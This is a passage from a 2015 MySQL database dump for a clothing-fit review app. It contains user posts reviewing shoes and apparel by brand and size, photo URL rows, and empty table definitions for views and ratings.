(56, 159, 'https://s3.amazonaws.com/linkqlo/159/20150326010236/cover.jpg', 638, 640, 'I love this pair of #puma ! it''s stylish and comfortable, and the hidden wedge makes my legs longer.', 16, 1, 'Puma', 'Sky Wedge', '7', '5', 1, 0, '2015-03-25 07:02:42'),
(57, 159, 'https://s3.amazonaws.com/linkqlo/159/20150326012610/cover.jpg', 638, 640, 'This #nike is my workout shoes. Very comfortable and light. I never have painful knees that I usually do with my super old nike  after 1.5 hour treadmill. Size 7 fits me.', 16, 1, 'Nike', 'Womens Zoom Structure + 17', '7', '5', 1, 0, '2015-03-25 07:26:12'),
(58, 151, 'https://s3.amazonaws.com/linkqlo/151/20150326053502/cover.jpg', 640, 640, 'These Asics shoes are the best I found so far. You can feel the protection, care, soft bottom and light weight right away with them on. I can easily run one more mile. ', 16, 0, '', '', '', '3', 1, 0, '2015-03-25 13:36:29'),
(59, 161, 'https://s3.amazonaws.com/linkqlo/161/20150326054259/cover.jpg', 640, 640, 'Always like bright colorsfor window shopping. Thought I would look like an aunty in street line dance in this #Zara chiffon top. It turned out not so terrible. If not for its rather short length (half butt is my minimum requirement), I probably would have taken it. ', 12, 1, 'Zara', '', 'L', '3', 1, 0, '2015-03-25 13:43:40'),
(60, 161, 'https://s3.amazonaws.com/linkqlo/161/20150326060423/cover.jpg', 639, 640, 'Seems everyone else has a Dri FIT. I decide to join the club. I do like the "dri" part, but not the "fit". Managed to pull it on myself with controlled breathing. Sigh, another "what happens in fitting room stays in fitting room". ', 8, 1, 'Nike', 'Dri FIT', 'L', '3', 1, 0, '2015-03-25 14:04:34'),
(61, 162, 'https://s3.amazonaws.com/linkqlo/162/20150325072946/cover.jpg', 640, 640, 'This is a very confortable vest from #thenorthface . Super light and it fits great.', 12, 1, 'The North Face', '', 'XS', '4', 1, 0, '2015-03-25 17:30:18'),
(62, 162, 'https://s3.amazonaws.com/linkqlo/162/20150325074149/cover.jpg', 640, 640, 'Great jacket for running or any sport. Two materials including Primaloft and elastic polyester (I think). It''s warm for cold weather.', 10, 1, 'The North Face', '', 'S', '3', 1, 0, '2015-03-25 17:41:49'),
(63, 172, 'https://s3.amazonaws.com/linkqlo/172/20150326114253/cover.jpg', 640, 606, 'Cole Haan Air Lucarno Penny. Beautiful calf made in Italy but it''s got Nike Air in it!!  Was such a nice fit that I bought the last pair at a Newport store off the display (the guy polished the right shoe and said "perfect!" but the wear was clearly different from my left shoe for a while...).   Then in 2012 Nike sold Cole Haan to Tommy Hilfiger! I heard at a Cole Haan store that the license for Nike Air leather shoes would last at least for a few years. My solution... get another exactly same pair before they run out!  Turns out they look better used & properly treated ;)', 16, 0, '', '', '', '3', 1, 0, '2015-03-25 17:43:01'),
(64, 162, 'https://s3.amazonaws.com/linkqlo/162/20150325075016/cover.jpg', 640, 640, 'The best ultralight goose down jacket! Comfortable, warm, light and great color!', 10, 1, 'Patagonia', '', 'S', '5', 1, 0, '2015-03-25 17:50:17'),
(65, 162, 'https://s3.amazonaws.com/linkqlo/162/20150325075603/cover.jpg', 640, 640, '#adidas classic shoes. Very comfortable.', 16, 1, 'Adidas', '', '7', '3', 1, 0, '2015-03-25 17:56:04'),
(66, 162, 'https://s3.amazonaws.com/linkqlo/162/20150325075955/cover.jpg', 640, 640, 'Great #newbalance shoes for running (very light!). I use them for short runs.', 16, 1, 'New Balance', '', '8.5', '4', 1, 0, '2015-03-25 18:00:03'),
(67, 172, 'https://s3.amazonaws.com/linkqlo/172/20150326120545/cover.jpg', 640, 640, 'A|X pre-worn jeans. I like the color and relaxed fit. The holes in the back pocket initially had lining but they''re now real holes - can''t hold coins. But best of all, the seriously thick metal label keeps my back bullet proof and makes nice sound in washing machines.  It sometimes escapes metal detectors but never fails to alert body scanners. TSA: "Uh, we don''t recommend wearing jeans with big metal onto a plane"... But I wear these 9 out of 10 days!', 1, 0, '', '', '', '3', 1, 0, '2015-03-25 18:05:48'),
(68, 174, 'https://s3.amazonaws.com/linkqlo/174/20150325070724/cover.jpg', 640, 640, 'I got these Nike Free shoes more than a year ago and coming straight from the washing machine they still look just like brand new. I''m size 7,5 in the US (normally 37 in EU but 38,5 for this shoe) and I''ve never had a more comfy footwear in my life. Also love the colors and the materials.', 16, 1, 'Nike', 'Free', '7.5', '5', 1, 0, '2015-03-25 21:07:28'),
(69, 150, 'https://s3.amazonaws.com/linkqlo/150/20150326164936/cover.jpg', 638, 640, '#nike This Nike Dri-Fit pants is terrific but not for sports. It fit me so well. And the most important thing is, it is Long Long Long enough!', 2, 1, 'Nike', '', 'XS/2', '5', 1, 0, '2015-03-26 00:49:49'),
(71, 21, 'https://s3.amazonaws.com/linkqlo/21/20150326224543/cover.jpg', 640, 640, '#athleta mostly makes women''s athletic apparels, but I really like many of its dresses and skirts for casual wear - very Californian. This maxi skirt is one of my favorite - comfortable and the asymmetric patterns are quite special. The fabric drapes very well and is very easy to care - I just throw them into washer and dryer. It has survived the washings quite well. ', 15, 1, 'Athleta', 'maxi skirt', 'XS/2', '5', 1, 0, '2015-03-26 06:45:52'),
(72, 148, 'https://s3.amazonaws.com/linkqlo/148/20150326085254/cover.jpg', 640, 640, 'A fun tie ', 13, 1, 'Charles Tyrwhitt', '', '', '5', 1, 0, '2015-03-26 06:52:57'),
(73, 148, 'https://s3.amazonaws.com/linkqlo/148/20150326085732/cover.jpg', 640, 640, 'Fun Socks for work', 16, 1, 'Charles Tyrwhitt', '', '8.5', '3', 1, 0, '2015-03-26 06:57:34'),
(74, 148, 'https://s3.amazonaws.com/linkqlo/148/20150326090417/cover.jpg', 640, 640, 'Gel 1150 Asia. Bought online, cheap and light, perfect fit', 16, 1, 'Asics', 'gel 1150', '9', '5', 1, 0, '2015-03-26 07:04:20'),
(75, 147, 'https://s3.amazonaws.com/linkqlo/147/20150327064936/cover.jpg', 639, 640, '#NAUTICA  Nautica Women''s Reversible Packable Puffer Hoodie. It''s really useful for those outdoor enthusiastsLightweigt, warm, easy packingand most important for girls, it''s reversible which means when you take a picture you even could have two choices. Also since it is lightweight, I can easily fit a jacket or a hoodie under it for extra warmth.', 10, 0, '', '', 'L/4', '5', 1, 0, '2015-03-26 14:49:45'),
(76, 151, 'https://s3.amazonaws.com/linkqlo/151/20150327064225/cover.jpg', 640, 640, 'This Zegna suit was bought by someone for me. It is zero weight so feel feels rightly light and you can see the size in the picture. She is professional at clothing so did not even bother to measure me, and it fits. It''s not the suit I like best but it does fit. ', 13, 1, 'Zegna ', 'Zero Weight', '52', '5', 1, 0, '2015-03-26 15:04:07'),
(77, 173, 'https://s3.amazonaws.com/linkqlo/173/20150326032338/cover.jpg', 638, 640, 'Dark neon pink #thenorthface jacket. Very comfortable, ideal for windy and cold weather activities. Nice stand collar for additional warmth. Bought while vacationing in South Lake Tahoe in sale for $130. Travelled with me around the world - from USA to Iceland to Europe.', 10, 1, 'The North Face', '#A7WZ season S13', 'S/4', '4', 1, 0, '2015-03-26 17:23:46'),
(78, 173, 'https://s3.amazonaws.com/linkqlo/173/20150326042607/cover.jpg', 640, 640, 'Full zip #underarmor hoodie in light grey with blue stripes. Very comfortable cotton material. I use it when training outside or to keep me warm after intense workout. Bought in sale for $45 on UA website.', 11, 1, 'Under Armor', 'women''s charged cotton storm marble hoodie', 'XS/2', '4', 1, 0, '2015-03-26 18:26:10'),
(79, 173, 'https://s3.amazonaws.com/linkqlo/173/20150326042822/cover.jpg', 640, 640, 'HeatGear short sleeve #underarmor t-shirt in carbon heather color. Very silky-like material, great feel when working out, it cools you down. ', 8, 0, '', '', '', '3', 1, 0, '2015-03-26 18:28:24'),
(80, 173, 'https://s3.amazonaws.com/linkqlo/173/20150326043243/cover.jpg', 638, 638, 'Dark neon pink #underarmor flyweight t-shirt. Super soft, no bulking when working out. Keeps me cool and dry. It''s got also UPF protection, protects skin from sun damage, very nice having in California :)', 8, 1, 'Under Armor', 'UA flyweight', 'S/4', '4', 1, 0, '2015-03-26 18:32:44'),
(81, 174, 'https://s3.amazonaws.com/linkqlo/174/20150326103042/cover.jpg', 640, 640, 'I love those #Coach flats because of the high quality material, nice design and good fit. The perforated leather and the trim of a different type of leather gives them a nice touch so I can wear them for more formal occasions too.', 16, 1, 'Coach', 'Daisey', '7.5', '5', 1, 0, '2015-03-27 00:30:45'),
(82, 161, 'https://s3.amazonaws.com/linkqlo/161/20150327211537/cover.jpg', 640, 640, 'I wouldn''t go shop for jeans in Shanghai even in my most optimistic days. U may think in a city of 24MM people, even a fraction of it is a decent market size. Sadly NO! All my jeans supply had come from my biyearly pilgrimage to US headquarter, until I accidentally put on my hubby''s #uniqlo slim fit jeans on a half-awaken Sat morning. It fit better than any of my jeans except for the length. I got one for myself on the same morning. I''ve been wearing this pair for almost all weekends in the past year. Still no sign of worn down. Love it!', 1, 1, 'Uniqlo', 'men''s slim fit', 'XL/12', '5', 1, 0, '2015-03-27 05:16:09'),
(83, 166, 'https://s3.amazonaws.com/linkqlo/166/20150328023943/cover.jpg', 640, 640, 'Love those shoes. Very light and water proof (gore tex all around), which is great for Singapore with its frequent showers but might be of interest in Seattle and Portland as well.', 16, 0, '', '', '', '3', 1, 0, '2015-03-27 10:39:59'),
(84, 58, 'https://s3.amazonaws.com/linkqlo/58/20150327051726/cover.jpg', 639, 640, 'The sleeves are long for me but I like the style and it quite warm for northeast winter', 11, 1, 'Banana Republic', 'RN 54023', 'XS/0', '4', 1, 0, '2015-03-27 13:17:27'),
(86, 181, 'https://s3.amazonaws.com/linkqlo/181/20150327081219/cover.jpg', 640, 640, 'Lulu lemon purple jacket. Size 2, fits well', 5, 0, '', '', '', '3', 1, 0, '2015-03-27 22:12:20'),
(87, 181, 'https://s3.amazonaws.com/linkqlo/181/20150327081457/cover.jpg', 640, 640, 'Lululemon jacket size 2. Fits great', 5, 0, '', '', '', '3', 1, 0, '2015-03-27 22:14:58'),
(88, 180, 'https://s3.amazonaws.com/linkqlo/180/20150327121559/cover.jpg', 640, 640, 'What I love about this #nike running top:\nSoft material, nice fit, cuff of the sleeve is made so it covers the top of your hand for added warmth on colder days, versatile, perfect for a run with long running pants on colder days, or with shorts on warm days for protection from the sun. ', 12, 1, 'Nike', '', 'S/0', '5', 1, 0, '2015-03-28 02:16:03'),
(89, 180, 'https://s3.amazonaws.com/linkqlo/180/20150327122323/cover.jpg', 640, 640, 'What I like about this #lululemon tennis skirt:\nlightweight, comfortable, built-in spandex shorts holds tennis balls well while playing, design with the ruffles on the skirt.', 15, 1, 'Lululemon', '', 'XXS/6', '4', 1, 0, '2015-03-28 02:23:31'),
(90, 180, 'https://s3.amazonaws.com/linkqlo/180/20150327123457/cover.jpg', 640, 640, 'What I love about these #lululemon tights:\nThicker material keeps me warm on cold days, comfortable, made with silverescent which prevents growth of odour-causing bacteria, stitching on the tights make them look more technical and makes me feel sporty!', 7, 1, 'Lululemon', '', 'XXS/6', '5', 1, 0, '2015-03-28 02:35:04'),
(91, 176, 'https://s3.amazonaws.com/linkqlo/176/20150328193333/cover.jpg', 640, 640, 'Super comfy #asics "gel-kayano" shoes. Fits snug ', 16, 0, '', '', '', '3', 1, 0, '2015-03-28 03:35:08'),
(92, 147, 'https://s3.amazonaws.com/linkqlo/147/20150328203509/cover.jpg', 640, 640, '#Tommy Hilfiger Women Slim Fit Crewneck  T-Shirt.Good quality fabric and fits me  perfect. Doesn''t stretch out of shape.  I have three colors with the same style, so you know how much I love it.', 8, 0, '', '', '', '3', 1, 0, '2015-03-28 04:38:50'),
(94, 150, 'https://s3.amazonaws.com/linkqlo/150/20150328222415/cover.jpg', 640, 640, 'We were told that this brand and model of shoes are the best. So we bought them for 25 km trail running.  They are so colorful!', 16, 1, 'Salomon', 'speedcross', '7.5', '5', 1, 0, '2015-03-28 06:25:51'),
(95, 62, 'https://s3.amazonaws.com/linkqlo/62/20150329011806/cover.jpg', 640, 640, 'slum dunk', 8, 0, '', '', '', '3', 1, 0, '2015-03-28 09:32:11'),
(96, 172, 'https://s3.amazonaws.com/linkqlo/172/20150329054754/cover.jpg', 640, 638, 'Ralph Lauren black label flight jacket. I like the fit and many pockets and purposeless leather trim. There''s a Velcro on right arm without anything attached. I asked what that''s for and a handsome looking Ralph Lauren guy goes "just... Never mind (and buy it already)" so I did. Maybe it has to do with something I heard from a friend who worked as an in-house carpenter for Polo shop interiors: Ralph Lauren designers aren''t allowed to add pockets and else unless they search for an old photos to prove that it''s an authentic design. ', 10, 1, 'Ralph Lauren', 'Flight jacket', 'S', '5', 1, 0, '2015-03-28 11:47:58'),
(97, 172, 'https://s3.amazonaws.com/linkqlo/172/20150329064121/cover.jpg', 640, 640, 'Cheaney Wingcap Brogue. It always puzzled us Tube-riding lads why there are so few rubber soled proper shoes sold In a rainy city like London. So I used to re-sole most of my nice leather soled shoes with cheap rubbers, ignoring the disgusted look on the repair man. One day my boss calls me and brings out a heavy paper bag with a pair of Cheaney in it, goes "Aren''t those my cheaper shoes you''re wearing?" The Friday before we had a big sake night (and in some cultures we take our shoes off!) His conclusion: well, it was a fun night we don''t even remember much. My conclusion: Cheaneys sure feel more expensive and comfortable!', 16, 0, '', '', '', '3', 1, 0, '2015-03-28 12:41:28'),
(99, 21, 'https://s3.amazonaws.com/linkqlo/21/20150329071213/cover.jpg', 639, 640, 'Extremely light Flyknit racer in hot pink! I once wore these sneakers to a clinic for a blood test. The nurse obviously liked my matching sneakers and scarf. After drawing my blood, she kept rummaging through several drawers until she found some matching bandages in hot pink to finish my look. That final touch brightened my day!', 16, 1, 'Nike', 'Flyknit racer (unisex)', '7', '5', 1, 0, '2015-03-28 15:12:17'),
(100, 172, 'https://s3.amazonaws.com/linkqlo/172/20150329103242/cover.jpg', 640, 640, 'Talaa- #Cheaney reborn. Nasty nails on the toe...', 16, 0, '', '', '', '3', 1, 0, '2015-03-28 16:32:59'),
(102, 58, 'https://s3.amazonaws.com/linkqlo/58/20150328094002/cover.jpg', 640, 637, 'Love this #thenorthface pant for it being a perfect hiking outfit: waterproof, easily convertible to a short, and also has a stow pocket ', 2, 1, 'The North Face', '', '0', '5', 1, 0, '2015-03-28 17:40:02'),
(103, 153, 'https://s3.amazonaws.com/linkqlo/153/20150328050315/cover.jpg', 640, 640, 'Loro Piana light jacket. Size 52. Fits very well. Storm System with cashmere lining, keeps you warm in cold SF wind and rain. Lots of pockets. Owned it for 4 years and wore it a lot. This particular color is no longer available but the jacket design with different color is available all year long. ', 5, 1, 'Loro Piana', 'storm System', 'L', '3', 1, 0, '2015-03-28 19:03:19'),
(104, 10, 'https://s3.amazonaws.com/linkqlo/10/20150328143335/cover.jpg', 640, 640, 'The greatest virtue about this #armaniexchange shirt is its transparency. It''s very thin, very light, and very see-through. The seemingly random pattern on the shirt looks cool. I was told that the more wrinkles it has the better it looks, so this shirt has endured years of torture of wide varieties from me, including being wrapped up like a towel in my suitcase while still half wet, etc, to achieve that effect. I sweat a lot, especially when dancing or at crowded parties. This #ArmaniExchange has had its fair share of those days first-hand during my Stanford Sloan days.', 14, 1, 'Armani Exchange', '', 'L', '4', 1, 0, '2015-03-29 04:33:37'),
(105, 10, 'https://s3.amazonaws.com/linkqlo/10/20150328145319/cover.jpg', 640, 640, '#BrooksBrothers saw me through my corporate days in General Electric in Boston and 12580/Impression Arts in Beijing. It''s never stylish but goes well with the sometimes dull image of a finance guy from my past life. It''s good for money though, for its truly outstanding #non-iron feature. I.never.need.to.iron.it. My house-maid in Beijing, who had a lot of experience with ironing all sorts of men''s shirt, was totally mesmerized by its non-iron thing as it made her work much easier - just hang it up after wash and the shirt will look as new with clear definition. She was a huge fan. The #BrooksBrothers store in Boston often had deals of 3-piece for $150-160 and I filled my wardrobe with them of many different cuttings. I like this particular piece for the pinkish color and warm all-cotton fabric. However, it''s slightly too big for me on my back, and sleeves are slightly too long. That''s my struggle with this brand...either I get the collar size right, or the sleeves right, or the cutting right, but hardly hit al', 3, 1, 'Brooks Brothers', 'classic', '16/32/33', '3', 1, 0, '2015-03-29 04:53:21'),
(106, 153, 'https://s3.amazonaws.com/linkqlo/153/20150328172303/cover.jpg', 640, 640, 'ETRO suede jacket. Size 52. Fits perfectly. The suede is very light so it is perfect for traveling. You can tell it is Etro because of the outrageous lining. I like the jacket because it makes me look slimmer which is always nice. ', 5, 1, 'Etro ', '', 'L', '3', 1, 0, '2015-03-29 07:23:06'),
(107, 182, 'https://s3.amazonaws.com/linkqlo/182/20150330041716/cover.jpg', 638, 638, 'Great for running errands whilst staying to the sports-chic look!', 10, 1, 'Lululemon', 'Define Jacket', 'S/4', '5', 1, 0, '2015-03-29 12:17:25'),
(108, 147, 'https://s3.amazonaws.com/linkqlo/147/20150330055214/cover.jpg', 640, 640, '#MAX MARA WEEKEND It was my last Valentine''s Day gift. The overcoat is so gorgeous. The color, texture and all the details are great. I''m usually a size 4. Though it seems  a little bit larger that I could wear a thick sweater inside. One of my favourite coat.', 5, 1, 'MAXMARA ', 'Weekend', 'S/4', '5', 1, 0, '2015-03-29 13:54:27');

-- --------------------------------------------------------

--
-- Table structure for table `post_photos`
--

CREATE TABLE IF NOT EXISTS `post_photos` (
`post_photo_id` int(11) NOT NULL,
  `post_id` int(11) NOT NULL,
  `photo_url` varchar(100) NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=128 ;

--
-- Dumping data for table `post_photos`
--

INSERT INTO `post_photos` (`post_photo_id`, `post_id`, `photo_url`) VALUES
(1, 1, 'https://s3.amazonaws.com/linkqlo/10/20150315022059/photo01.jpg'),
(2, 1, 'https://s3.amazonaws.com/linkqlo/10/20150315022059/photo02.jpg'),
(3, 1, 'https://s3.amazonaws.com/linkqlo/10/20150315022059/photo03.jpg'),
(4, 1, 'https://s3.amazonaws.com/linkqlo/10/20150315022059/photo04.jpg'),
(5, 2, 'https://s3.amazonaws.com/linkqlo/10/20150315033959/photo01.jpg'),
(6, 2, 'https://s3.amazonaws.com/linkqlo/10/20150315033959/photo02.jpg'),
(7, 2, 'https://s3.amazonaws.com/linkqlo/10/20150315033959/photo03.jpg'),
(8, 2, 'https://s3.amazonaws.com/linkqlo/10/20150315033959/photo04.jpg'),
(9, 2, 'https://s3.amazonaws.com/linkqlo/10/20150315033959/photo05.jpg'),
(10, 3, 'https://s3.amazonaws.com/linkqlo/10/20150315045504/photo01.jpg'),
(11, 3, 'https://s3.amazonaws.com/linkqlo/10/20150315045504/photo02.jpg'),
(12, 3, 'https://s3.amazonaws.com/linkqlo/10/20150315045504/photo03.jpg'),
(13, 3, 'https://s3.amazonaws.com/linkqlo/10/20150315045504/photo04.jpg'),
(14, 3, 'https://s3.amazonaws.com/linkqlo/10/20150315045504/photo05.jpg'),
(15, 4, 'https://s3.amazonaws.com/linkqlo/10/20150315185538/photo01.jpg'),
(16, 4, 'https://s3.amazonaws.com/linkqlo/10/20150315185538/photo02.jpg'),
(17, 5, 'https://s3.amazonaws.com/linkqlo/21/20150317204711/photo01.jpg'),
(18, 5, 'https://s3.amazonaws.com/linkqlo/21/20150317204711/photo02.jpg'),
(19, 6, 'https://s3.amazonaws.com/linkqlo/21/20150319041718/photo01.jpg'),
(20, 6, 'https://s3.amazonaws.com/linkqlo/21/20150319041718/photo02.jpg'),
(21, 6, 'https://s3.amazonaws.com/linkqlo/21/20150319041718/photo03.jpg'),
(22, 11, 'https://s3.amazonaws.com/linkqlo/21/20150322014419/photo01.jpg'),
(23, 11, 'https://s3.amazonaws.com/linkqlo/21/20150322014419/photo02.jpg'),
(24, 11, 'https://s3.amazonaws.com/linkqlo/21/20150322014419/photo03.jpg'),
(25, 13, 'https://s3.amazonaws.com/linkqlo/147/20150322165123/photo01.jpg'),
(26, 13, 'https://s3.amazonaws.com/linkqlo/147/20150322165123/photo02.jpg'),
(27, 13, 'https://s3.amazonaws.com/linkqlo/147/20150322165123/photo03.jpg'),
(28, 18, 'https://s3.amazonaws.com/linkqlo/49/20150322084651/photo01.jpg'),
(29, 18, 'https://s3.amazonaws.com/linkqlo/49/20150322084651/photo02.jpg'),
(30, 23, 'https://s3.amazonaws.com/linkqlo/154/20150322043406/photo01.jpg'),
(31, 23, 'https://s3.amazonaws.com/linkqlo/154/20150322043406/photo02.jpg'),
(32, 23, 'https://s3.amazonaws.com/linkqlo/154/20150322043406/photo03.jpg'),
(33, 24, 'https://s3.amazonaws.com/linkqlo/154/20150322044225/photo01.jpg'),
(34, 24, 'https://s3.amazonaws.com/linkqlo/154/20150322044225/photo02.jpg'),
(35, 25, 'https://s3.amazonaws.com/linkqlo/154/20150322044945/photo01.jpg'),
(36, 25, 'https://s3.amazonaws.com/linkqlo/154/20150322044945/photo02.jpg'),
(37, 26, 'https://s3.amazonaws.com/linkqlo/154/20150322051005/photo01.jpg'),
(38, 26, 'https://s3.amazonaws.com/linkqlo/154/20150322051005/photo02.jpg'),
(39, 26, 'https://s3.amazonaws.com/linkqlo/154/20150322051005/photo03.jpg'),
(40, 27, 'https://s3.amazonaws.com/linkqlo/154/20150322051515/photo01.jpg'),
(41, 27, 'https://s3.amazonaws.com/linkqlo/154/20150322051515/photo02.jpg'),
(42, 27, 'https://s3.amazonaws.com/linkqlo/154/20150322051515/photo03.jpg'),
(44, 29, 'https://s3.amazonaws.com/linkqlo/49/20150322113752/photo01.jpg'),
(45, 30, 'https://s3.amazonaws.com/linkqlo/59/20150322115534/photo01.jpg'),
(46, 30, 'https://s3.amazonaws.com/linkqlo/59/20150322115534/photo02.jpg'),
(47, 31, 'https://s3.amazonaws.com/linkqlo/160/20150322094412/photo01.jpg'),
(48, 32, 'https://s3.amazonaws.com/linkqlo/160/20150322101049/photo01.jpg'),
(49, 32, 'https://s3.amazonaws.com/linkqlo/160/20150322101049/photo02.jpg'),
(50, 32, 'https://s3.amazonaws.com/linkqlo/160/20150322101049/photo03.jpg'),
(51, 33, 'https://s3.amazonaws.com/linkqlo/146/20150322102245/photo01.jpg'),
(52, 33, 'https://s3.amazonaws.com/linkqlo/146/20150322102245/photo02.jpg'),
(53, 34, 'https://s3.amazonaws.com/linkqlo/147/20150323172140/photo01.jpg'),
(54, 34, 'https://s3.amazonaws.com/linkqlo/147/20150323172140/photo02.jpg'),
(55, 34, 'https://s3.amazonaws.com/linkqlo/147/20150323172140/photo03.jpg'),
(56, 35, 'https://s3.amazonaws.com/linkqlo/145/20150323191201/photo01.jpg'),
(57, 35, 'https://s3.amazonaws.com/linkqlo/145/20150323191201/photo02.jpg'),
(58, 35, 'https://s3.amazonaws.com/linkqlo/145/20150323191201/photo03.jpg'),
(59, 38, 'https://s3.amazonaws.com/linkqlo/153/20150323050256/photo01.jpg'),
(60, 38, 'https://s3.amazonaws.com/linkqlo/153/20150323050256/photo02.jpg'),
(61, 39, 'https://s3.amazonaws.com/linkqlo/153/20150323051428/photo01.jpg'),
(62, 40, 'https://s3.amazonaws.com/linkqlo/153/20150323062313/photo01.jpg'),
(63, 41, 'https://s3.amazonaws.com/linkqlo/153/20150323063338/photo01.jpg'),
(64, 42, 'https://s3.amazonaws.com/linkqlo/153/20150323064105/photo01.jpg'),
(65, 45, 'https://s3.amazonaws.com/linkqlo/147/20150325005850/photo01.jpg'),
(66, 45, 'https://s3.amazonaws.com/linkqlo/147/20150325005850/photo02.jpg'),
(67, 45, 'https://s3.amazonaws.com/linkqlo/147/20150325005850/photo03.jpg'),
(68, 48, 'https://s3.amazonaws.com/linkqlo/150/20150325192826/photo01.jpg'),
(69, 48, 'https://s3.amazonaws.com/linkqlo/150/20150325192826/photo02.jpg'),
(70, 49, 'https://s3.amazonaws.com/linkqlo/10/20150324140719/photo01.jpg'),
(71, 49, 'https://s3.amazonaws.com/linkqlo/10/20150324140719/photo02.jpg'),
(72, 49, 'https://s3.amazonaws.com/linkqlo/10/20150324140719/photo03.jpg'),
(73, 50, 'https://s3.amazonaws.com/linkqlo/157/20150325201115/photo01.jpg'),
(74, 50, 'https://s3.amazonaws.com/linkqlo/157/20150325201115/photo02.jpg'),
(75, 56, 'https://s3.amazonaws.com/linkqlo/159/20150326010236/photo01.jpg'),
(76, 56, 'https://s3.amazonaws.com/linkqlo/159/20150326010236/photo02.jpg'),
(77, 56, 'https://s3.amazonaws.com/linkqlo/159/20150326010236/photo03.jpg'),
(78, 57, 'https://s3.amazonaws.com/linkqlo/159/20150326012610/photo01.jpg'),
(79, 57, 'https://s3.amazonaws.com/linkqlo/159/20150326012610/photo02.jpg'),
(80, 57, 'https://s3.amazonaws.com/linkqlo/159/20150326012610/photo03.jpg'),
(81, 58, 'https://s3.amazonaws.com/linkqlo/151/20150326053502/photo01.jpg'),
(82, 61, 'https://s3.amazonaws.com/linkqlo/162/20150325072946/photo01.jpg'),
(83, 62, 'https://s3.amazonaws.com/linkqlo/162/20150325074149/photo01.jpg'),
(84, 62, 'https://s3.amazonaws.com/linkqlo/162/20150325074149/photo02.jpg'),
(85, 63, 'https://s3.amazonaws.com/linkqlo/172/20150326114253/photo01.jpg'),
(86, 64, 'https://s3.amazonaws.com/linkqlo/162/20150325075016/photo01.jpg'),
(87, 64, 'https://s3.amazonaws.com/linkqlo/162/20150325075016/photo02.jpg'),
(88, 66, 'https://s3.amazonaws.com/linkqlo/162/20150325075955/photo01.jpg'),
(89, 66, 'https://s3.amazonaws.com/linkqlo/162/20150325075955/photo02.jpg'),
(90, 67, 'https://s3.amazonaws.com/linkqlo/172/20150326120545/photo01.jpg'),
(91, 69, 'https://s3.amazonaws.com/linkqlo/150/20150326164936/photo01.jpg'),
(92, 69, 'https://s3.amazonaws.com/linkqlo/150/20150326164936/photo02.jpg'),
(93, 69, 'https://s3.amazonaws.com/linkqlo/150/20150326164936/photo03.jpg'),
(96, 75, 'https://s3.amazonaws.com/linkqlo/147/20150327064936/photo01.jpg'),
(97, 76, 'https://s3.amazonaws.com/linkqlo/151/20150327064225/photo01.jpg'),
(98, 76, 'https://s3.amazonaws.com/linkqlo/151/20150327064225/photo02.jpg'),
(99, 76, 'https://s3.amazonaws.com/linkqlo/151/20150327064225/photo03.jpg'),
(100, 78, 'https://s3.amazonaws.com/linkqlo/173/20150326042607/photo01.jpg'),
(101, 78, 'https://s3.amazonaws.com/linkqlo/173/20150326042607/photo02.jpg'),
(102, 79, 'https://s3.amazonaws.com/linkqlo/173/20150326042822/photo01.jpg'),
(103, 79, 'https://s3.amazonaws.com/linkqlo/173/20150326042822/photo02.jpg'),
(104, 80, 'https://s3.amazonaws.com/linkqlo/173/20150326043243/photo01.jpg'),
(105, 82, 'https://s3.amazonaws.com/linkqlo/161/20150327211537/photo01.jpg'),
(106, 84, 'https://s3.amazonaws.com/linkqlo/58/20150327051726/photo01.jpg'),
(107, 88, 'https://s3.amazonaws.com/linkqlo/180/20150327121559/photo01.jpg'),
(108, 88, 'https://s3.amazonaws.com/linkqlo/180/20150327121559/photo02.jpg'),
(109, 89, 'https://s3.amazonaws.com/linkqlo/180/20150327122323/photo01.jpg'),
(110, 89, 'https://s3.amazonaws.com/linkqlo/180/20150327122323/photo02.jpg'),
(111, 90, 'https://s3.amazonaws.com/linkqlo/180/20150327123457/photo01.jpg'),
(112, 92, 'https://s3.amazonaws.com/linkqlo/147/20150328203509/photo01.jpg'),
(113, 92, 'https://s3.amazonaws.com/linkqlo/147/20150328203509/photo02.jpg'),
(114, 96, 'https://s3.amazonaws.com/linkqlo/172/20150329054754/photo01.jpg'),
(115, 100, 'https://s3.amazonaws.com/linkqlo/172/20150329103242/photo01.jpg'),
(118, 102, 'https://s3.amazonaws.com/linkqlo/58/20150328094002/photo01.jpg'),
(119, 102, 'https://s3.amazonaws.com/linkqlo/58/20150328094002/photo02.jpg'),
(120, 104, 'https://s3.amazonaws.com/linkqlo/10/20150328143335/photo01.jpg'),
(121, 104, 'https://s3.amazonaws.com/linkqlo/10/20150328143335/photo02.jpg'),
(122, 104, 'https://s3.amazonaws.com/linkqlo/10/20150328143335/photo03.jpg'),
(123, 104, 'https://s3.amazonaws.com/linkqlo/10/20150328143335/photo04.jpg'),
(124, 104, 'https://s3.amazonaws.com/linkqlo/10/20150328143335/photo05.jpg'),
(125, 105, 'https://s3.amazonaws.com/linkqlo/10/20150328145319/photo01.jpg'),
(126, 105, 'https://s3.amazonaws.com/linkqlo/10/20150328145319/photo02.jpg'),
(127, 108, 'https://s3.amazonaws.com/linkqlo/147/20150330055214/photo01.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `post_views`
--

CREATE TABLE IF NOT EXISTS `post_views` (
`post_view_id` int(20) NOT NULL,
  `post_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `ratings`
--

CREATE TABLE IF NOT EXISTS `ratings` (
`rating_id` int(11) NOT NULL,
  `post_id` int(11) DEFAULT NULL,
  `fitting_report` varchar(512) NOT NULL DEFAULT '',
  `fit_rating` int(2) DEFAULT '0',
  `length_rating` int(2) DEFAULT '0',
  `waist_rating` int(2) DEFAULT '0',
  `rear_rating` int(2) DEFAULT '0',
  `rise_rating` int(2) DEFAULT '0',
  `leg_rating` int(2) DEFAULT '0',
  `comfort_rating` int(2) DEFAULT '0',
  `quality_rating` int(2) DEFAULT '0',
  `style_rating` int(2) DEFAULT '0',
  `ease_rating` int(2) DEFAULT '0',
  `durability_rating` int(2) DEFAULT '0',
  `occasion_rating` int(2) DEFAULT '0'
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=109 ;

--
-- Dumping data for table `ratings`
--

